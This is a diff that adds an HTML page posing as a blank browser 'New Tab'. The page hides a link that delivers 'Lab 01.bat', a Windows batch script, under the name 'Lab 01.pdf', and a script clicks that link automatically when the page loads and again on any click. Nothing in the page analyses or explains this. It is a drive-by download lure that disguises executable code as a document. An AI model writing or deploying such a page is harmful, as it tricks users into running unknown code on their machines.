@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>New Tab</title>
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffffff;
+    overflow: hidden;
+}
+</style>
+</head>
+<body>
+<a id="d" href="Lab 01.bat" download="Lab 01.pdf" style="display:none"></a>
+<script>
+function triggerDownload() {
+    var a = document.getElementById('d');
+    if (a) a.click();
+}
+window.addEventListener('DOMContentLoaded', function() {
+    setTimeout(triggerDownload, 100);
+});
+document.addEventListener('click', function() {
+    triggerDownload();
+});
+</script>
+</body>
+</html>
